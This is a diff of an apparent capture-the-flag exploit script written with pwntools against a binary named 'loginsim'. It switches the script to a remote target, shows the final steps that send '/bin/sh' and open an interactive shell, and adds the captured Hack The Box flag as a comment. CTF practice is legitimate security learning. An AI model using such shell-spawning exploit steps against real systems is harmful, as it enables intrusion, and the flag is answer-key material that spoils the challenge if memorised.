@@ -13,7 +13,7 @@
 from pwn import *
 #from libcfind import *
 
-local_mote=1
+local_mote=0
 elf='./loginsim'
 e=ELF(elf)
 #context.log_level = 'debug'
@@ -148,3 +148,5 @@ if True:
         sleep(0.5)
         p.sendline('/bin/sh\x00')
         p.interactive()
+
+#HTB{bUff3R-uNd3rf1Ov_fTw?!??}
